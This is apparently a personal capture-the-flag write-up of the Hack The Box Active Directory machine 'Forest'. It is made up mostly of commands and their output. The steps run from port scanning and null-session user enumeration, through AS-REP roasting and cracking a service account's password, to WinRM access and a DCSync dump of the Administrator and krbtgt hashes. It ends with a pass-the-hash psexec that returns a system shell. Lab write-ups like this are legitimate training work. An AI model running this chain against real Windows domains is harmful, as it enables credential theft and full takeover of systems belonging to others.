# Nmap

```shell
nmap -A 10.10.10.161 -p-  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 11:55 EDT
Nmap scan report for 10.10.10.161
Host is up (0.022s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-04-15 16:04:27Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49682/tcp open  msrpc        Microsoft Windows RPC
49702/tcp open  msrpc        Microsoft Windows RPC
49955/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-04-15T09:05:20-07:00
| smb2-time: 
|   date: 2024-04-15T16:05:21
|_  start_date: 2024-04-14T09:41:04
|_clock-skew: mean: 2h27m52s, deviation: 4h02m30s, median: 7m51s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

# Null Session with RPC Client
```shell
rpcclient -U "" -N 10.10.10.161

rpcclient $> querydominfo
Domain:         HTB
Server:
Comment:
Total Users:    111
Total Groups:   0
Total Aliases:  0
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000000


```

## Enumerating Users with RPC Client
```shell
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[user] rid:[0x2582]
user:[atomic] rid:[0x2584]
user:[atomic1] rid:[0x2585]
user:[atomic2] rid:[0x2586]
user:[atomic3] rid:[0x2587]
user:[qwe] rid:[0x2588]

```

# Enum4linux
```shell
enum4linux-ng -P 10.10.10.161 -oA ../forest
ENUM4LINUX - next generation (v1.3.2)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.10.161
[*] Username ......... ''
[*] Random Username .. 'rkinzjin'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on 10.10.10.161    |
 =====================================
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================
|    SMB Dialect Check on 10.10.10.161    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                         
  SMB 1.0: true                                                                                                                                             
  SMB 2.02: true                                                                                                                                            
  SMB 2.1: true                                                                                                                                             
  SMB 3.0: true                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                  
SMB1 only: false                                                                                                                                            
SMB signing required: true                                                                                                                                  

 ===========================================================
|    Domain Information via SMB session for 10.10.10.161    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FOREST                                                                                                                               
NetBIOS domain name: HTB                                                                                                                                    
DNS domain: htb.local                                                                                                                                       
FQDN: FOREST.htb.local                                                                                                                                      
Derived membership: domain member                                                                                                                           
Derived domain: HTB                                                                                                                                         

 =========================================
|    RPC Session Check on 10.10.10.161    |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ===================================================
|    Domain Information via RPC for 10.10.10.161    |
 ===================================================
[+] Domain: HTB
[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565
[+] Membership: domain member

 =========================================
|    Policies via RPC for 10.10.10.161    |
 =========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:                                                                                                                                
  Password history length: 24                                                                                                                               
  Minimum password length: 7                                                                                                                                
  Maximum password age: not set                                                                                                                             
  Password properties:                                                                                                                                      
  - DOMAIN_PASSWORD_COMPLEX: false                                                                                                                          
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                                                                                                   
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                                                                                                  
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                                                                                                   
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                                                                                         
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                                                                                           
Domain lockout information:                                                                                                                                 
  Lockout observation window: 30 minutes                                                                                                                    
  Lockout duration: 30 minutes                                                                                                                              
  Lockout threshold: None                                                                                                                                   
Domain logoff information:                                                                                                                                  
  Force logoff time: not set                                                                                                                                

Completed after 1.50 seconds

```

# CrackMapExec
## Enumerating users
```shell
crackmapexec smb 10.10.10.161 --users
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] Error enumerating domain users using dc ip 10.10.10.161: NTLM needs domain\username and a password
SMB         10.10.10.161    445    FOREST           [*] Trying with SAMRPC protocol
SMB         10.10.10.161    445    FOREST           [+] Enumerated domain user(s)
SMB         10.10.10.161    445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.10.161    445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.161    445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
SMB         10.10.10.161    445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA           
SMB         10.10.10.161    445    FOREST           htb.local\SM_2c8eef0a09b545acb           
SMB         10.10.10.161    445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b           
SMB         10.10.10.161    445    FOREST           htb.local\SM_75a538d3025e4db9a           
SMB         10.10.10.161    445    FOREST           htb.local\SM_681f53d4942840e18           
SMB         10.10.10.161    445    FOREST           htb.local\SM_1b41c9286325456bb           
SMB         10.10.10.161    445    FOREST           htb.local\SM_9b69f1b9d2cc45549           
SMB         10.10.10.161    445    FOREST           htb.local\SM_7c96b981967141ebb           
SMB         10.10.10.161    445    FOREST           htb.local\SM_c75ee099d0a64c91b           
SMB         10.10.10.161    445    FOREST           htb.local\SM_1ffab36a2f5f479cb           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc3d7722           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfc9daad           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc0a90c9           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox670628e           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox968e74d           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox6ded678           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox83d6781           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfd87238           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxb01ac64           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox7108a4e           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox0659cc1           
SMB         10.10.10.161    445    FOREST           htb.local\sebastien                      
SMB         10.10.10.161    445    FOREST           htb.local\lucinda                        
SMB         10.10.10.161    445    FOREST           htb.local\svc-alfresco                   
SMB         10.10.10.161    445    FOREST           htb.local\andy                           
SMB         10.10.10.161    445    FOREST           htb.local\mark                           
SMB         10.10.10.161    445    FOREST           htb.local\santi                          
SMB         10.10.10.161    445    FOREST           htb.local\user                           
SMB         10.10.10.161    445    FOREST           htb.local\atomic                         
SMB         10.10.10.161    445    FOREST           htb.local\atomic1                        
SMB         10.10.10.161    445    FOREST           htb.local\atomic2                        
SMB         10.10.10.161    445    FOREST           htb.local\atomic3                        
SMB         10.10.10.161    445    FOREST           htb.local\qwe                            

```

# Kerberos ticket
```shell
GetNPUsers.py htb.local/ -usersfile valid_users.txt -dc-ip 10.10.10.161 -no-pass -format john
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

$krb5asrep$svc-alfresco@HTB.LOCAL:8343921581d61246d594db0fc7b364e4$3c5ba76edb24b8402b7e6ab476418345c1121b560bacd0f9dcd8c19a3760795ca19be06143c4bf97dd4c2d6f8f7b0dfecb48e7dd9db46c6cf6a4f01ed6f5379a1c993444f2b0240e3105dff6f9680900776b601c1a84b5bd32b98e6e6985d26b7745925ff27e48cb8c53400677ca1f303d2eda4bf05408eef63e31c7d2d6891c7fe9e3fdab25123a6f050439008ce4c3284dff3770b439658b33f277288cc6a5bde0dff1b5bd3316e057453572099be9e981155884d45184fe0b0b3232c76483a94671e9e362fd3d8bbf67f0a4a8803af4e3fa42c8aaafdc6d8c1eca420d37e4927d2a8bb81e

```
## Cracked Password
```shell
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt kerb_hash.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
==s3rvice==          ($krb5asrep$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:02 DONE (2024-04-16 00:30) 0.4444g/s 1815Kp/s 1815Kc/s 1815KC/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

# SMB Enumeration
```shell
smbclient -L \\\\10.10.10.161\\ -U svc-alfresco%s3rvice

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
## SYSVOL
```shell
smbclient \\\\10.10.10.161\\SYSVOL -U svc-alfresco%s3rvice
Try "help" to get a list of possible commands.
smb: \> DIR
  .                                   D        0  Wed Sep 18 13:45:49 2019
  ..                                  D        0  Wed Sep 18 13:45:49 2019
  htb.local                          Dr        0  Wed Sep 18 13:45:49 2019

```

# Evil-Winrm
I was able to connect to winrm and execute the sharp hound binary to create json files for my bloodhound grapher.
```shell
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir

```

# BloodHound Data
## Principals with DCSync Rights
![[Pasted image 20240416061054.png]]
## Domain Admin Rights
![[Pasted image 20240416061146.png]]

## Shortest Path to High Value Targets
![[Pasted image 20240416061547.png]]
![[Pasted image 20240416063447.png]]

## WriteDACL Rights

The Exchange Windows Permissions group has writeDACL rights over the htb.local domain
![[Pasted image 20240416104915.png]]
### Svc-alfresco domain group
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> net user svc-alfresco /domain
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/16/2024 3:01:08 AM
Password expires             Never
Password changeable          4/17/2024 3:01:08 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/16/2024 2:35:40 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.

```

More importantly svc user is a foreign member of the **account operators group which can administer domain user and group accounts**
# User flag

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
7d11cdfa4e8494de59c02bf4649d3c88

```

![[Pasted image 20240416143013.png]]
![[Pasted image 20240416143032.png]]
# Dumped Hashes
```shell
secretsdump.py htb/hacker@10.10.10.161
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b



```

# Pass The Hash
```shell
psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file YtjiDSMm.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service lwYl on 10.10.10.161.....
[*] Starting service lwYl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```